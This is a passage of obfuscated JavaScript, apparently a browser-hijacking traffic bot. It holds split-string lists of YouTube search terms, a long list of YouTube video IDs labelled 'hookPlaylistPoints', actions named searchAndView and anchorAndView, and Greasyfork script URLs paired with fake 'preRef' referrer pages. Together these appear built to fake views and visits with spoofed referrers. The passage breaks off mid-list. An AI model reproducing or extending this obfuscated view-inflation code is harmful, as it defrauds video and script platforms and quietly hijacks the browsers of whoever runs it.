'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x9 * 0x30e + 0x12d3 * -0x1 + -0x8a1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x4 * -0x873 + -0x1 * 0x7ca + -0xcfc * 0x2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x196d + -0x585 + -0x19 * -0x13d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    Y(0x10) + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    Y(0x4) + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    Y(0x8) + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x15) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x3, 'nU)x') + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + Y(0x0) + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + Y(0x14) + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
